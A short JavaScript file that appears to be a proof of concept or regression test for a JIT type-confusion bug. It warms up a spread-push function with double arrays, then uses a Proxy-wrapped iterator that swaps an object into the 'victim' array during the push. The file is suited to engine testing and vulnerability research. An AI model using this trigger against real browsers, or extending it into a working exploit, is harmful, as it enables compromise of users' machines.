function bug(victim, trigger) {
    victim.push(...trigger);
}

for (let i = 0; i < 20000; ++i) {
    bug([1.1, 2.2], [3.3, 4.4]);
}

let victim_arr = [1.1, 2.2];
let has_triggered = false;

const trigger_obj = {
    [Symbol.iterator]: () => ({
        next: () => {
            if (has_triggered) {
                return { done: true };
            }
            has_triggered = true;
            victim_arr[0] = {};
            return { value: 5.5, done: false };
        }
    })
};

const p_trigger = new Proxy(trigger_obj, {});

bug(victim_arr, p_trigger);